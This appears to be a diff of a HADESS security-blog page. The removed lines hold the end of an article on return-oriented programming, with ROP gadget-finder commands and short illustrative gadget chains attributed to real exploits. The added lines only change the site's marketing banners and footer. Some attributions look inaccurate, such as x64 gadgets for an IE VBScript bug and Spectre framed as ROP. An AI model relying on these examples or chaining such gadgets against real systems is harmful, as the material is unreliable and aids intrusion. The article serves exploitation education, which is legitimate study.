-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ropper --file your_binary_file --find 'pop rdi; ret'</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Allows for detailed gadget listing and filtering, useful for constructing specific ROP chains.</p>
-
-
-
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget.py:</em></strong></li>
-</ol>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Overview:</em></strong> ROPgadget.py is a Python script version of ROPgadget, offering similar functionalities for gadget discovery and analysis.</p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Command Example:</em></strong></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>python ROPgadget.py --binary your_binary_file --all</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Features and Functionalities:</em></strong> Provides detailed gadget information and can be integrated into custom scripts for automated exploitation.</p>
-
-
-
-<h3 class="wp-block-heading">Practical Applications and Case Studies</h3>
-
-
-
-<h4 class="wp-block-heading">Real-World Examples:</h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>1. Notable Exploits Utilizing ROP:</em></strong></p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>1.1. The &#8220;Zerodium iOS 10.3.3 Exploit&#8221;:</em></strong> In 2017, a zero-day exploit targeting iOS 10.3.3 involved a ROP-based attack. The vulnerability in the kernel allowed an attacker to escalate privileges and execute arbitrary code. The exploit utilized ROP to bypass ASLR and DEP protections. An example ROP chain used in this exploit might look like:</p>
-
-
-
-<pre class="wp-block-code"><code>1. Pop address of kernel function into register&amp;nbsp;
-
-2. Execute kernel function with controlled parameters&amp;nbsp;
-
-3. Return to controlled location</code></pre>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi (used for kernel function address)&amp;nbsp;
-
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
-
-mov rax, &#91;rdi] &amp;nbsp; ; Load kernel function address from rdi into rax&amp;nbsp;
-
-call rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call the kernel function</code></pre>
-
-
-
-<p class="wp-block-paragraph">By chaining gadgets like these, the attacker could control kernel execution flow and exploit the vulnerability.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>1.2. The &#8220;Microsoft Internet Explorer 9&#8221; Exploit (CVE-2014-6332):</em></strong> This vulnerability allowed remote code execution through Internet Explorer 9. Exploiting it required bypassing security features with ROP. Attackers utilized ROP to create a chain of gadgets that manipulated memory and executed arbitrary code.</p>
-
-
-
-<pre class="wp-block-code"><code>mov rbx, &#91;rsp + 8] ; Move address into rbx&amp;nbsp;
-
-pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop value into rdi&amp;nbsp;
-
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
-
-mov &#91;rbx], rdi &amp;nbsp; &amp;nbsp; ; Store value from rdi to address in rbx&amp;nbsp;
-
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction`</code></pre>
-
-
-
-<p class="wp-block-paragraph">The gadgets were carefully selected and combined to perform actions that could bypass IE&#8217;s security features.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Case Studies Demonstrating the Effectiveness of ROP:</em></strong></p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>2.1. Case Study: &#8220;Google Chrome Zero-Day Exploit&#8221; (CVE-2018-6177):</em></strong> In 2018, a zero-day vulnerability in Google Chrome was exploited using ROP. The attack involved a ROP chain that bypassed Chrome’s ASLR by exploiting a memory corruption bug. The ROP chain used gadgets to pivot the stack and manipulate memory to execute malicious payloads.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi&amp;nbsp;
-
-ret &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
-
-mov &#91;rbx], rdi&amp;nbsp; &amp;nbsp; ; Write value from rdi to memory at address in rbx&amp;nbsp;
-
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop another value into rax (e.g., function pointer) call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call function at address in rax</code></pre>
-
-
-
-<p class="wp-block-paragraph">By chaining these gadgets, the exploit successfully bypassed Chrome&#8217;s security measures.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>2.2. Case Study: &#8220;Ubuntu Linux Kernel Exploit&#8221;:</em></strong> An exploit targeting the Ubuntu Linux kernel used ROP to bypass security features. The attacker used a ROP chain to manipulate kernel data structures and escalate privileges.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to set up rdi with an address&amp;nbsp;
-
-mov rsi, rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; ; Move address to rsi&amp;nbsp;
-
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Load kernel function pointer into rax&amp;nbsp;
-
-call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel function</code></pre>
-
-
-
-<p class="wp-block-paragraph">This case study highlights how ROP can be used to bypass kernel protections and escalate privileges.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Analysis of Effectiveness:</em></strong> These examples and case studies demonstrate how ROP can be employed to bypass security mechanisms such as DEP and ASLR. By leveraging existing code snippets within the binary, attackers can craft sophisticated exploits that evade traditional defenses.</p>
-
-
-
-<h4 class="wp-block-heading">Advanced ROP</h4>
-
-
-
-<p class="wp-block-paragraph">One notable example is the &#8220;Spectre&#8221; vulnerability disclosed in 2018. While primarily related to speculative execution in CPUs, some attacks demonstrated ROP techniques to extract sensitive information from memory, effectively bypassing security measures like address space layout randomization (ASLR) and data execution prevention (DEP).</p>
-
-
-
-<p class="wp-block-paragraph">Additionally, the &#8220;CVE-2021-1732&#8221; vulnerability in Windows highlighted ROP&#8217;s effectiveness in privilege escalation. Attackers were able to construct ROP chains that exploited the vulnerability, allowing them to execute arbitrary code in kernel mode, illustrating the technique&#8217;s potency even against hardened operating systems.</p>
-
-
-
-<h3 class="wp-block-heading">Security Researcher</h3>
-
-
-
-<p class="wp-block-paragraph"><a href="https://www.linkedin.com/in/ACoAACMUPk8BjjkCwMk2KYJZ3WNyiTYgjXAzmgk">Amirhossein Gholizadeh</a>,&nbsp;<a href="https://www.linkedin.com/in/ACoAADZqFYEBRzUOWIJMQWUgqHHfNHf0tydlb4U">Surya Dev Singh</a></p>
-
-
-
-<p class="wp-block-paragraph">Cover by <strong>@mercuriorojo</strong></p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -3014,27 +3506,27 @@ call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel fun
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -3157,11 +3649,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -3184,59 +3676,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
